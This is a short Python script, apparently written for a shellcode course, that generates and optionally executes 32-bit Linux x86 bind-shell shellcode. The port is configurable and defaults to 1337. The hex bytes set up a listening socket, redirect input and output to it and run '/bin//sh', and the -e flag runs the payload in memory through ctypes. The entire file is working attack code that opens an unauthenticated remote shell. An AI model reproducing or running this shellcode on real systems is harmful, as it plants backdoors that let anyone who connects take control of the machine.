#!/usr/bin/python3

# Demey Alexandre
# PA-14186

from ctypes import CDLL, CFUNCTYPE, c_char_p, cast
from sys import argv
import argparse

# Setting the arguments
parser = argparse.ArgumentParser()
parser.add_argument("-e", "--exec",
                    help="If set, the shellcode is printed to the screen then executed",
                    action="store_true")
parser.add_argument("-p", "--port", type=int,
                    help="Change the port to bind (Default:1337)")
args = parser.parse_args()

# Change port number if a custom one is given
port = 1337
if args.port and args.port > 0 and args.port <= 65535:
    port = args.port

# Format the port 
port = "{0:0{1}x}".format(port,4)
port = "\\x" + port[:2] + "\\x" + port[2:]

# Insert the port in the shellcode
shellcode_str = "\\x31\\xdb\\xf7\\xe3\\x53\\x43\\x53\\x6a\\x02\\x89\\xe1\\x04\\x66\\xcd"\
"\\x80\\x97\\x5b\\x52\\x66\\x68{}\\x66\\x53\\x89\\xe1\\x6a\\x10\\x51\\x57\\x89\\xe1\\x6a"\
"\\x66\\x58\\xcd\\x80\\x52\\x57\\x89\\xe1\\xd1\\xe3\\xb0\\x66\\xcd\\x80\\x52\\x52\\x57"\
"\\x89\\xe1\\x43\\xb0\\x66\\xcd\\x80\\x93\\x6a\\x03\\x59\\x49\\xb0\\x3f\\xcd\\x80\\x75"\
"\\xf9\\x52\\x68\\x2f\\x2f\\x73\\x68\\x68\\x2f\\x62\\x69\\x6e\\x89\\xe3\\xb0\\x0b\\xcd"\
"\\x80".format(port)

shellcode_bytes = bytes.fromhex(shellcode_str.replace('\\x',''))
print("Shellcode size : {}".format(len(shellcode_bytes)))
print('"{}"'.format(shellcode_str))

if args.exec :
    libc = CDLL("libc.so.6")

    c_shell_p = c_char_p(shellcode_bytes)

    launch = cast(c_shell_p, CFUNCTYPE(c_char_p))

    launch()
